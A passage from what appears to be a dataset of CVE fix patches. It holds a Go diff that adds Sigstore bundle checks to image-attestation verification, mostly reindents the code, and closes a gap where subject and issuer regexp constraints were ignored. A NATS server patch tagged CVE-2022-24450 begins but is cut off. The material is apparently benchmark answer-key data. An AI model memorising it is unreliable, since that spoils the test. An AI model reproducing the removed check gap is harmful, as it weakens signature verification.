decodeStatements(signatures)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn &images.Response{Digest: digest, Statements: inTotoStatements}, nil\n+        if opts.SigstoreBundle {\n+                results, err := verifyBundleAndFetchAttestations(ctx, opts)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                if len(results) == 0 {\n+                        return nil, fmt.Errorf(\"sigstore bundle verification failed: no matching signatures found\")\n+                }\n+\n+                statements, err := decodeStatementsFromBundles(results)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                return &images.Response{Digest: results[0].Desc.Digest.String(), Statements: statements}, nil\n+        }\n+        cosignOpts, err := buildCosignOptions(ctx, opts)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        nameOpts := opts.Client.NameOptions()\n+        signatures, bundleVerified, err := tracing.ChildSpan3(\n+                ctx,\n+                \"\",\n+                \"VERIFY IMG ATTESTATIONS\",\n+                func(ctx context.Context, span trace.Span) (checkedAttestations []oci.Signature, bundleVerified bool, err error) {\n+                        ref, err := name.ParseReference(opts.ImageRef, nameOpts...)\n+                        if err != nil {\n+                                return nil, false, fmt.Errorf(\"failed to parse image: %w\", err)\n+                        }\n+                        return client.VerifyImageAttestations(ctx, ref, cosignOpts)\n+                },\n+        )\n+        if err != nil {\n+                msg := err.Error()\n+                logger.Info(\"failed to fetch attestations\", \"error\", msg)\n+                if strings.Contains(msg, \"MANIFEST_UNKNOWN: manifest unknown\") {\n+                        return nil, fmt.Errorf(\"not found\")\n+                }\n+\n+                return nil, err\n+        }\n+\n+        payload, err := extractPayload(signatures)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        for _, signature := range signatures {\n+                match, predicateType, err := matchType(signature, opts.Type)\n+                if err != nil {\n+                        return nil, err\n+                }\n+\n+                if !match {\n+                        logger.V(4).Info(\"type doesn't match, continue\", \"expected\", opts.Type, \"received\", predicateType)\n+                        continue\n+                }\n+\n+                if err := matchSignatures([]oci.Signature{signature}, opts.Subject, opts.SubjectRegExp, opts.Issuer, opts.IssuerRegExp, opts.AdditionalExtensions); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        err = checkAnnotations(payload, opts.Annotations)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        logger.V(3).Info(\"verified images\", \"signatures\", len(signatures), \"bundleVerified\", bundleVerified)\n+        inTotoStatements, digest, err := decodeStatements(signatures)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        return &images.Response{Digest: digest, Statements: inTotoStatements}, nil\n }\n \n func matchType(sig oci.Signature, expectedType string) (bool, string, error) {\n-\tif expectedType != \"\" {\n-\t\tstatement, _, err := decodeStatement(sig)\n-\t\tif err != nil {\n-\t\t\treturn false, \"\", fmt.Errorf(\"failed to decode type: %w\", err)\n-\t\t}\n-\n-\t\tif pType, ok := statement[\"type\"]; ok {\n-\t\t\tif pType.(string) == expectedType {\n-\t\t\t\treturn true, pType.(string), nil\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn false, \"\", nil\n+        if expectedType != \"\" {\n+                statement, _, err := decodeStatement(sig)\n+                if err != nil {\n+                        return false, \"\", fmt.Errorf(\"failed to decode type: %w\", err)\n+                }\n+\n+                if pType, ok := statement[\"type\"]; ok {\n+                        if pType.(string) == expectedType {\n+                                return true, pType.(string), nil\n+                        }\n+                }\n+        }\n+        return false, \"\", nil\n }\n \n func decodeStatements(sigs []oci.Signature) ([]map[string]interface{}, string, error) {\n-\tif len(sigs) == 0 {\n-\t\treturn []map[string]interface{}{}, \"\", nil\n-\t}\n-\n-\tvar digest string\n-\tvar statement map[string]interface{}\n-\tdecodedStatements := make([]map[string]interface{}, len(sigs))\n-\tfor i, sig := range sigs {\n-\t\tvar err error\n-\t\tstatement, digest, err = decodeStatement(sig)\n-\t\tif err != nil {\n-\t\t\treturn nil, \"\", err\n-\t\t}\n-\n-\t\tdecodedStatements[i] = statement\n-\t}\n-\n-\treturn decodedStatements, digest, nil\n+        if len(sigs) == 0 {\n+                return []map[string]interface{}{}, \"\", nil\n+        }\n+\n+        var digest string\n+        var statement map[string]interface{}\n+        decodedStatements := make([]map[string]interface{}, len(sigs))\n+        for i, sig := range sigs {\n+                var err error\n+                statement, digest, err = decodeStatement(sig)\n+                if err != nil {\n+                        return nil, \"\", err\n+                }\n+\n+                decodedStatements[i] = statement\n+        }\n+\n+        return decodedStatements, digest, nil\n }\n \n func decodeStatement(sig oci.Signature) (map[string]interface{}, string, error) {\n-\tvar digest string\n-\n-\tpld, err := sig.Payload()\n-\tif err != nil {\n-\t\treturn nil, \"\", fmt.Errorf(\"failed to decode payload: %w\", err)\n-\t}\n-\n-\tsci := payload.SimpleContainerImage{}\n-\tif err := json.Unmarshal(pld, &sci); err != nil {\n-\t\treturn nil, \"\", fmt.Errorf(\"error decoding the payload: %w\", err)\n-\t}\n-\n-\tif d := sci.Critical.Image.DockerManifestDigest; d != \"\" {\n-\t\tdigest = d\n-\t}\n-\n-\tdata := make(map[string]interface{})\n-\tif err := json.Unmarshal(pld, &data); err != nil {\n-\t\treturn nil, \"\", fmt.Errorf(\"failed to unmarshal JSON payload: %v: %w\", sig, err)\n-\t}\n-\n-\tif dataPayload, ok := data[\"payload\"]; !ok {\n-\t\treturn nil, \"\", fmt.Errorf(\"missing payload in %v\", data)\n-\t} else {\n-\t\tdecodedStatement, err := decodePayload(dataPayload.(string))\n-\t\tif err != nil {\n-\t\t\treturn nil, \"\", fmt.Errorf(\"failed to decode statement %s: %w\", string(pld), err)\n-\t\t}\n-\t\tdecodedStatement[\"type\"] = decodedStatement[\"predicateType\"]\n-\n-\t\treturn decodedStatement, digest, nil\n-\t}\n+        var digest string\n+\n+        pld, err := sig.Payload()\n+        if err != nil {\n+                return nil, \"\", fmt.Errorf(\"failed to decode payload: %w\", err)\n+        }\n+\n+        sci := payload.SimpleContainerImage{}\n+        if err := json.Unmarshal(pld, &sci); err != nil {\n+                return nil, \"\", fmt.Errorf(\"error decoding the payload: %w\", err)\n+        }\n+\n+        if d := sci.Critical.Image.DockerManifestDigest; d != \"\" {\n+                digest = d\n+        }\n+\n+        data := make(map[string]interface{})\n+        if err := json.Unmarshal(pld, &data); err != nil {\n+                return nil, \"\", fmt.Errorf(\"failed to unmarshal JSON payload: %v: %w\", sig, err)\n+        }\n+\n+        if dataPayload, ok := data[\"payload\"]; !ok {\n+                return nil, \"\", fmt.Errorf(\"missing payload in %v\", data)\n+        } else {\n+                decodedStatement, err := decodePayload(dataPayload.(string))\n+                if err != nil {\n+                        return nil, \"\", fmt.Errorf(\"failed to decode statement %s: %w\", string(pld), err)\n+                }\n+                decodedStatement[\"type\"] = decodedStatement[\"predicateType\"]\n+\n+                return decodedStatement, digest, nil\n+        }\n }\n \n func decodePayload(payloadBase64 string) (map[string]interface{}, error) {\n-\tstatementRaw, err := base64.StdEncoding.DecodeString(payloadBase64)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to base64 decode payload for %v: %w\", statementRaw, err)\n-\t}\n-\n-\tvar statement in_toto.Statement //nolint:staticcheck\n-\tif err := json.Unmarshal(statementRaw, &statement); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif statement.Type != attestation.CosignCustomProvenanceV01 {\n-\t\t// This assumes that the following statements are JSON objects:\n-\t\t// - in_toto.PredicateSLSAProvenanceV01\n-\t\t// - in_toto.PredicateLinkV1\n-\t\t// - in_toto.PredicateSPDX\n-\t\t// any other custom predicate\n-\t\treturn datautils.ToMap(statement)\n-\t}\n-\n-\treturn decodeCosignCustomProvenanceV01(statement)\n+        statementRaw, err := base64.StdEncoding.DecodeString(payloadBase64)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to base64 decode payload for %v: %w\", statementRaw, err)\n+        }\n+\n+        var statement in_toto.Statement //nolint:staticcheck\n+        if err := json.Unmarshal(statementRaw, &statement); err != nil {\n+                return nil, err\n+        }\n+\n+        if statement.Type != attestation.CosignCustomProvenanceV01 {\n+                // This assumes that the following statements are JSON objects:\n+                // - in_toto.PredicateSLSAProvenanceV01\n+                // - in_toto.PredicateLinkV1\n+                // - in_toto.PredicateSPDX\n+                // any other custom predicate\n+                return datautils.ToMap(statement)\n+        }\n+\n+        return decodeCosignCustomProvenanceV01(statement)\n }\n \n func decodeCosignCustomProvenanceV01(statement in_toto.Statement) (map[string]interface{}, error) { //nolint:staticcheck\n-\tif statement.Type != attestation.CosignCustomProvenanceV01 {\n-\t\treturn nil, fmt.Errorf(\"invalid statement type %s\", attestation.CosignCustomProvenanceV01)\n-\t}\n-\n-\tpredicate, ok := statement.Predicate.(map[string]interface{})\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"failed to decode CosignCustomProvenanceV01\")\n-\t}\n-\n-\tcosignPredicateData := predicate[\"Data\"]\n-\tif cosignPredicateData == nil {\n-\t\treturn nil, fmt.Errorf(\"missing predicate in CosignCustomProvenanceV01\")\n-\t}\n-\n-\t// attempt to parse as a JSON object type\n-\tdata, err := stringToJSONMap(cosignPredicateData)\n-\tif err == nil {\n-\t\tpredicate[\"Data\"] = data\n-\t\tstatement.Predicate = predicate\n-\t}\n-\n-\treturn datautils.ToMap(statement)\n+        if statement.Type != attestation.CosignCustomProvenanceV01 {\n+                return nil, fmt.Errorf(\"invalid statement type %s\", attestation.CosignCustomProvenanceV01)\n+        }\n+\n+        predicate, ok := statement.Predicate.(map[string]interface{})\n+        if !ok {\n+                return nil, fmt.Errorf(\"failed to decode CosignCustomProvenanceV01\")\n+        }\n+\n+        cosignPredicateData := predicate[\"Data\"]\n+        if cosignPredicateData == nil {\n+                return nil, fmt.Errorf(\"missing predicate in CosignCustomProvenanceV01\")\n+        }\n+\n+        // attempt to parse as a JSON object type\n+        data, err := stringToJSONMap(cosignPredicateData)\n+        if err == nil {\n+                predicate[\"Data\"] = data\n+                statement.Predicate = predicate\n+        }\n+\n+        return datautils.ToMap(statement)\n }\n \n func stringToJSONMap(i interface{}) (map[string]interface{}, error) {\n-\ts, ok := i.(string)\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"expected string type\")\n-\t}\n+        s, ok := i.(string)\n+        if !ok {\n+                return nil, fmt.Errorf(\"expected string type\")\n+        }\n \n-\tdata := map[string]interface{}{}\n-\tif err := json.Unmarshal([]byte(s), &data); err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to marshal JSON: %w\", err)\n-\t}\n+        data := map[string]interface{}{}\n+        if err := json.Unmarshal([]byte(s), &data); err != nil {\n+                return nil, fmt.Errorf(\"failed to marshal JSON: %w\", err)\n+        }\n \n-\treturn data, nil\n+        return data, nil\n }\n \n func decodePEM(raw []byte, signatureAlgorithm crypto.Hash) (signature.Verifier, error) {\n-\t// PEM encoded file.\n-\tpubKey, err := cryptoutils.UnmarshalPEMToPublicKey(raw)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"pem to public key: %w\", err)\n-\t}\n+        // PEM encoded file.\n+        pubKey, err := cryptoutils.UnmarshalPEMToPublicKey(raw)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"pem to public key: %w\", err)\n+        }\n \n-\treturn signature.LoadVerifier(pubKey, signatureAlgorithm)\n+        return signature.LoadVerifier(pubKey, signatureAlgorithm)\n }\n \n func extractPayload(verified []oci.Signature) ([]payload.SimpleContainerImage, error) {\n-\tsigPayloads := make([]payload.SimpleContainerImage, 0, len(verified))\n-\tfor _, sig := range verified {\n-\t\tpld, err := sig.Payload()\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to get payload: %w\", err)\n-\t\t}\n-\n-\t\tsci := payload.SimpleContainerImage{}\n-\t\tif err := json.Unmarshal(pld, &sci); err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error decoding the payload: %w\", err)\n-\t\t}\n-\n-\t\tsigPayloads = append(sigPayloads, sci)\n-\t}\n-\treturn sigPayloads, nil\n+        sigPayloads := make([]payload.SimpleContainerImage, 0, len(verified))\n+        for _, sig := range verified {\n+                pld, err := sig.Payload()\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to get payload: %w\", err)\n+                }\n+\n+                sci := payload.SimpleContainerImage{}\n+                if err := json.Unmarshal(pld, &sci); err != nil {\n+                        return nil, fmt.Errorf(\"error decoding the payload: %w\", err)\n+                }\n+\n+                sigPayloads = append(sigPayloads, sci)\n+        }\n+        return sigPayloads, nil\n }\n \n func extractDigest(imgRef string, payload []payload.SimpleContainerImage) (string, error) {\n-\tfor _, p := range payload {\n-\t\tif digest := p.Critical.Image.DockerManifestDigest; digest != \"\" {\n-\t\t\treturn digest, nil\n-\t\t} else {\n-\t\t\treturn \"\", fmt.Errorf(\"failed to extract image digest from signature payload for %s\", imgRef)\n-\t\t}\n-\t}\n-\treturn \"\", fmt.Errorf(\"digest not found for %s\", imgRef)\n+        for _, p := range payload {\n+                if digest := p.Critical.Image.DockerManifestDigest; digest != \"\" {\n+                        return digest, nil\n+                } else {\n+                        return \"\", fmt.Errorf(\"failed to extract image digest from signature payload for %s\", imgRef)\n+                }\n+        }\n+        return \"\", fmt.Errorf(\"digest not found for %s\", imgRef)\n }\n \n func matchSignatures(signatures []oci.Signature, subject, subjectRegExp, issuer, issuerRegExp string, extensions map[string]string) error {\n-\tif subject == \"\" && issuer == \"\" && len(extensions) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\tvar errs []error\n-\tfor _, sig := range signatures {\n-\t\tcert, err := sig.Cert()\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"failed to read certificate: %w\", err)\n-\t\t}\n-\n-\t\tif cert == nil {\n-\t\t\treturn fmt.Errorf(\"certificate not found\")\n-\t\t}\n-\n-\t\tif err := matchCertificateData(cert, subject, subjectRegExp, issuer, issuerRegExp, extensions); err != nil {\n-\t\t\terrs = append(errs, err)\n-\t\t} else {\n-\t\t\t// only one signature certificate needs to match the required subject, issuer, and extensions\n-\t\t\treturn nil\n-\t\t}\n-\t}\n-\n-\tif len(errs) > 0 {\n-\t\terr := multierr.Combine(errs...)\n-\t\treturn err\n-\t}\n-\n-\treturn fmt.Errorf(\"invalid signature\")\n+        if subject == \"\" && subjectRegExp == \"\" && issuer == \"\" && issuerRegExp == \"\" && len(extensions) == 0 {\n+                return nil\n+        }\n+\n+        var errs []error\n+        for _, sig := range signatures {\n+                cert, err := sig.Cert()\n+                if err != nil {\n+                        return fmt.Errorf(\"failed to read certificate: %w\", err)\n+                }\n+\n+                if cert == nil {\n+                        return fmt.Errorf(\"certificate not found\")\n+                }\n+\n+                if err := matchCertificateData(cert, subject, subjectRegExp, issuer, issuerRegExp, extensions); err != nil {\n+                        errs = append(errs, err)\n+                } else {\n+                        // only one signature certificate needs to match the required subject, issuer, and extensions\n+                        return nil\n+                }\n+        }\n+\n+        if len(errs) > 0 {\n+                err := multierr.Combine(errs...)\n+                return err\n+        }\n+\n+        return fmt.Errorf(\"invalid signature\")\n }\n \n func matchCertificateData(cert *x509.Certificate, subject, subjectRegExp, issuer, issuerRegExp string, extensions map[string]string) error {\n-\tif subject != \"\" || subjectRegExp != \"\" {\n-\t\tif sans := cryptoutils.GetSubjectAlternateNames(cert); len(sans) > 0 {\n-\t\t\tsubjectMatched := false\n-\t\t\tif subject != \"\" {\n-\t\t\t\tfor _, s := range sans {\n-\t\t\t\t\tif wildcard.Match(subject, s) {\n-\t\t\t\t\t\tsubjectMatched = true\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tif subjectRegExp != \"\" {\n-\t\t\t\tregex, err := regexp.Compile(subjectRegExp)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn fmt.Errorf(\"invalid regexp for subject: %s : %w\", subjectRegExp, err)\n-\t\t\t\t}\n-\t\t\t\tfor _, s := range sans {\n-\t\t\t\t\tif regex.MatchString(s) {\n-\t\t\t\t\t\tsubjectMatched = true\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tif !subjectMatched {\n-\t\t\t\tsub := \"\"\n-\t\t\t\tif subject != \"\" {\n-\t\t\t\t\tsub = subject\n-\t\t\t\t} else if subjectRegExp != \"\" {\n-\t\t\t\t\tsub = subjectRegExp\n-\t\t\t\t}\n-\t\t\t\treturn fmt.Errorf(\"subject mismatch: expected %s, received %s\", sub, strings.Join(sans, \", \"))\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif err := matchExtensions(cert, issuer, issuerRegExp, extensions); err != nil {\n-\t\treturn err\n-\t}\n-\n-\treturn nil\n+        if subject != \"\" || subjectRegExp != \"\" {\n+                if sans := cryptoutils.GetSubjectAlternateNames(cert); len(sans) > 0 {\n+                        subjectMatched := false\n+                        if subject != \"\" {\n+                                for _, s := range sans {\n+                                        if wildcard.Match(subject, s) {\n+                                                subjectMatched = true\n+                                                break\n+                                        }\n+                                }\n+                        }\n+                        if subjectRegExp != \"\" {\n+                                regex, err := regexp.Compile(subjectRegExp)\n+                                if err != nil {\n+                                        return fmt.Errorf(\"invalid regexp for subject: %s : %w\", subjectRegExp, err)\n+                                }\n+                                for _, s := range sans {\n+                                        if regex.MatchString(s) {\n+                                                subjectMatched = true\n+                                                break\n+                                        }\n+                                }\n+                        }\n+\n+                        if !subjectMatched {\n+                                sub := \"\"\n+                                if subject != \"\" {\n+                                        sub = subject\n+                                } else if subjectRegExp != \"\" {\n+                                        sub = subjectRegExp\n+                                }\n+                                return fmt.Errorf(\"subject mismatch: expected %s, received %s\", sub, strings.Join(sans, \", \"))\n+                        }\n+                }\n+        }\n+\n+        if err := matchExtensions(cert, issuer, issuerRegExp, extensions); err != nil {\n+                return err\n+        }\n+\n+        return nil\n }\n \n func matchExtensions(cert *x509.Certificate, issuer, issuerRegExp string, extensions map[string]string) error {\n-\tce := cosign.CertExtensions{Cert: cert}\n-\n-\tif issuer != \"\" || issuerRegExp != \"\" {\n-\t\tval := ce.GetIssuer()\n-\t\tif issuer != \"\" {\n-\t\t\tif !wildcard.Match(issuer, val) {\n-\t\t\t\treturn fmt.Errorf(\"issuer mismatch: expected %s, received %s\", issuer, val)\n-\t\t\t}\n-\t\t}\n-\t\tif issuerRegExp != \"\" {\n-\t\t\tif regex, err := regexp.Compile(issuerRegExp); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"invalid regexp for issuer: %s : %w\", issuerRegExp, err)\n-\t\t\t} else if !regex.MatchString(val) {\n-\t\t\t\treturn fmt.Errorf(\"issuer mismatch: expected %s, received %s\", issuerRegExp, val)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tfor requiredKey, requiredValue := range extensions {\n-\t\tval, err := extractCertExtensionValue(requiredKey, ce)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tif !wildcard.Match(requiredValue, val) {\n-\t\t\treturn fmt.Errorf(\"extension mismatch: expected %s for key %s, received %s\", requiredValue, requiredKey, val)\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        ce := cosign.CertExtensions{Cert: cert}\n+\n+        if issuer != \"\" || issuerRegExp != \"\" {\n+                val := ce.GetIssuer()\n+                if issuer != \"\" {\n+                        if !wildcard.Match(issuer, val) {\n+                                return fmt.Errorf(\"issuer mismatch: expected %s, received %s\", issuer, val)\n+                        }\n+                }\n+                if issuerRegExp != \"\" {\n+                        if regex, err := regexp.Compile(issuerRegExp); err != nil {\n+                                return fmt.Errorf(\"invalid regexp for issuer: %s : %w\", issuerRegExp, err)\n+                        } else if !regex.MatchString(val) {\n+                                return fmt.Errorf(\"issuer mismatch: expected %s, received %s\", issuerRegExp, val)\n+                        }\n+                }\n+        }\n+\n+        for requiredKey, requiredValue := range extensions {\n+                val, err := extractCertExtensionValue(requiredKey, ce)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                if !wildcard.Match(requiredValue, val) {\n+                        return fmt.Errorf(\"extension mismatch: expected %s for key %s, received %s\", requiredValue, requiredKey, val)\n+                }\n+        }\n+\n+        return nil\n }\n \n func extractCertExtensionValue(key string, ce cosign.CertExtensions) (string, error) {\n-\tswitch key {\n-\tcase cosign.CertExtensionOIDCIssuer, cosign.CertExtensionMap[cosign.CertExtensionOIDCIssuer]:\n-\t\treturn ce.GetIssuer(), nil\n-\tcase cosign.CertExtensionGithubWorkflowTrigger, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowTrigger]:\n-\t\treturn ce.GetCertExtensionGithubWorkflowTrigger(), nil\n-\tcase cosign.CertExtensionGithubWorkflowSha, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowSha]:\n-\t\treturn ce.GetExtensionGithubWorkflowSha(), nil\n-\tcase cosign.CertExtensionGithubWorkflowName, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowName]:\n-\t\treturn ce.GetCertExtensionGithubWorkflowName(), nil\n-\tcase cosign.CertExtensionGithubWorkflowRepository, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowRepository]:\n-\t\treturn ce.GetCertExtensionGithubWorkflowRepository(), nil\n-\tcase cosign.CertExtensionGithubWorkflowRef, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowRef]:\n-\t\treturn ce.GetCertExtensionGithubWorkflowRef(), nil\n-\tdefault:\n-\t\treturn \"\", fmt.Errorf(\"invalid certificate extension %s\", key)\n-\t}\n+        switch key {\n+        case cosign.CertExtensionOIDCIssuer, cosign.CertExtensionMap[cosign.CertExtensionOIDCIssuer]:\n+                return ce.GetIssuer(), nil\n+        case cosign.CertExtensionGithubWorkflowTrigger, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowTrigger]:\n+                return ce.GetCertExtensionGithubWorkflowTrigger(), nil\n+        case cosign.CertExtensionGithubWorkflowSha, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowSha]:\n+                return ce.GetExtensionGithubWorkflowSha(), nil\n+        case cosign.CertExtensionGithubWorkflowName, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowName]:\n+                return ce.GetCertExtensionGithubWorkflowName(), nil\n+        case cosign.CertExtensionGithubWorkflowRepository, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowRepository]:\n+                return ce.GetCertExtensionGithubWorkflowRepository(), nil\n+        case cosign.CertExtensionGithubWorkflowRef, cosign.CertExtensionMap[cosign.CertExtensionGithubWorkflowRef]:\n+                return ce.GetCertExtensionGithubWorkflowRef(), nil\n+        default:\n+                return \"\", fmt.Errorf(\"invalid certificate extension %s\", key)\n+        }\n }\n \n func checkAnnotations(payload []payload.SimpleContainerImage, annotations map[string]string) error {\n-\tfor _, p := range payload {\n-\t\tfor key, val := range annotations {\n-\t\t\tif val != p.Optional[key] {\n-\t\t\t\treturn fmt.Errorf(\"annotations mismatch: %s does not match expected value %s for key %s\",\n-\t\t\t\t\tp.Optional[key], val, key)\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        for _, p := range payload {\n+                for key, val := range annotations {\n+                        if val != p.Optional[key] {\n+                                return fmt.Errorf(\"annotations mismatch: %s does not match expected value %s for key %s\",\n+                                        p.Optional[key], val, key)\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n func getRekorPubs(ctx context.Context, rekorPubKey string) (*cosign.TrustedTransparencyLogPubKeys, error) {\n-\tif rekorPubKey == \"\" {\n-\t\treturn cosign.GetRekorPubs(ctx)\n-\t}\n-\n-\tpublicKeys := cosign.NewTrustedTransparencyLogPubKeys()\n-\tif err := publicKeys.AddTransparencyLogPubKey([]byte(rekorPubKey), tuf.Active); err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get rekor public keys: %w\", err)\n-\t}\n-\treturn &publicKeys, nil\n+        if rekorPubKey == \"\" {\n+                return cosign.GetRekorPubs(ctx)\n+        }\n+\n+        publicKeys := cosign.NewTrustedTransparencyLogPubKeys()\n+        if err := publicKeys.AddTransparencyLogPubKey([]byte(rekorPubKey), tuf.Active); err != nil {\n+                return nil, fmt.Errorf(\"failed to get rekor public keys: %w\", err)\n+        }\n+        return &publicKeys, nil\n }\n \n func getCTLogPubs(ctx context.Context, ctlogPubKey string) (*cosign.TrustedTransparencyLogPubKeys, error) {\n-\tif ctlogPubKey == \"\" {\n-\t\treturn cosign.GetCTLogPubs(ctx)\n-\t}\n-\n-\tpublicKeys := cosign.NewTrustedTransparencyLogPubKeys()\n-\tif err := publicKeys.AddTransparencyLogPubKey([]byte(ctlogPubKey), tuf.Active); err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get transparency log public keys: %w\", err)\n-\t}\n-\treturn &publicKeys, nil\n+        if ctlogPubKey == \"\" {\n+                return cosign.GetCTLogPubs(ctx)\n+        }\n+\n+        publicKeys := cosign.NewTrustedTransparencyLogPubKeys()\n+        if err := publicKeys.AddTransparencyLogPubKey([]byte(ctlogPubKey), tuf.Active); err != nil {\n+                return nil, fmt.Errorf(\"failed to get transparency log public keys: %w\", err)\n+        }\n+        return &publicKeys, nil\n }\n \n func splitPEMCertificateChain(pem []byte) (leaves, intermediates, roots []*x509.Certificate, err error) {\n-\tcerts, err := cryptoutils.UnmarshalCertificatesFromPEM(pem)\n-\tif err != nil {\n-\t\treturn nil, nil, nil, err\n-\t}\n-\n-\tfor _, cert := range certs {\n-\t\tif !cert.IsCA {\n-\t\t\tleaves = append(leaves, cert)\n-\t\t} else {\n-\t\t\t// root certificates are self-signed\n-\t\t\tif bytes.Equal(cert.RawSubject, cert.RawIssuer) {\n-\t\t\t\troots = append(roots, cert)\n-\t\t\t} else {\n-\t\t\t\tintermediates = append(intermediates, cert)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn leaves, intermediates, roots, nil\n+        certs, err := cryptoutils.UnmarshalCertificatesFromPEM(pem)\n+        if err != nil {\n+                return nil, nil, nil, err\n+        }\n+\n+        for _, cert := range certs {\n+                if !cert.IsCA {\n+                        leaves = append(leaves, cert)\n+                } else {\n+                        // root certificates are self-signed\n+                        if bytes.Equal(cert.RawSubject, cert.RawIssuer) {\n+                                roots = append(roots, cert)\n+                        } else {\n+                                intermediates = append(intermediates, cert)\n+                        }\n+                }\n+        }\n+\n+        return leaves, intermediates, roots, nil\n }\n"}
{"cve":"CVE-2022-24450:0708", "fix_patch": "diff --git a/server/client.go b/server/client.go\nindex ce2c0ee0..e5c009e1 100644\n--- a/server/client.go\n+++ b/server/client.go\n@@ -14,102 +14,102 @@\n package server\n \n import (\n-\t\"bytes\"\n-\t\"crypto/tls\"\n-\t\"crypto/x509\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"math/rand\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"regexp\"\n-\t\"runtime\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"sync/atomic\"\n-\t\"time\"\n-\n-\t\"github.com/nats-io/jwt/v2\"\n+        \"bytes\"\n+        \"crypto/tls\"\n+        \"crypto/x509\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"io\"\n+        \"math/rand\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"regexp\"\n+        \"runtime\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"sync/atomic\"\n+        \"time\"\n+\n+        \"github.com/nats-io/jwt/v2\"\n )\n \n // Type of client connection.\n const (\n-\t// CLIENT is an end user.\n-\tCLIENT = iota\n-\t// ROUTER represents another server in the cluster.\n-\tROUTER\n-\t// GATEWAY is a link between 2 clusters.\n-\tGATEWAY\n-\t// SYSTEM is an internal system client.\n-\tSYSTEM\n-\t// LEAF is for leaf node connections.\n-\tLEAF\n-\t// JETSTREAM is an internal jetstream client.\n-\tJETSTREAM\n-\t// ACCOUNT is for the internal client for accounts.\n-\tACCOUNT\n+        // CLIENT is an end user.\n+        CLIENT = iota\n+        // ROUTER represents another server in the cluster.\n+        ROUTER\n+        // GATEWAY is a link between 2 clusters.\n+        GATEWAY\n+        // SYSTEM is an internal system client.\n+        SYSTEM\n+        // LEAF is for leaf node connections.\n+        LEAF\n+        // JETSTREAM is an internal jetstream client.\n+        JETSTREAM\n+        // ACCOUNT is for the internal client for accounts.\n+        ACCOUNT\n )\n \n // Extended type of a CLIENT connection. This is returned by c.clientType()\n // and indicate what type of client connection we are dealing with.\n // If invoked on a non CLIENT connection, NON_CLIENT type is returned.\n const (\n-\t// If the connection is not a CLIENT connection.\n-\tNON_CLIENT = iota\n-\t// Regular NATS client.\n-\tNATS\n-\t// MQTT client.\n-\tMQTT\n-\t// Websocket client.\n-\tWS\n+        // If the connection is not a CLIENT connection.\n+        NON_CLIENT = iota\n+        // Regular NATS client.\n+        NATS\n+        // MQTT client.\n+        MQTT\n+        // Websocket client.\n+        WS\n )\n \n const (\n-\t// ClientProtoZero is the original Client protocol from 2009.\n-\t// http://nats.io/documentation/internals/nats-protocol/\n-\tClientProtoZero = iota\n-\t// ClientProtoInfo signals a client can receive more then the original INFO block.\n-\t// This can be used to update clients on other cluster members, etc.\n-\tClientProtoInfo\n+        // ClientProtoZero is the original Client protocol from 2009.\n+        // http://nats.io/documentation/internals/nats-protocol/\n+        ClientProtoZero = iota\n+        // ClientProtoInfo signals a client can receive more then the original INFO block.\n+        // This can be used to update clients on other cluster members, etc.\n+        ClientProtoInfo\n )\n \n const (\n-\tpingProto = \"PING\" + _CRLF_\n-\tpongProto = \"PONG\" + _CRLF_\n-\terrProto  = \"-ERR '%s'\" + _CRLF_\n-\tokProto   = \"+OK\" + _CRLF_\n+        pingProto = \"PING\" + _CRLF_\n+        pongProto = \"PONG\" + _CRLF_\n+        errProto  = \"-ERR '%s'\" + _CRLF_\n+        okProto   = \"+OK\" + _CRLF_\n 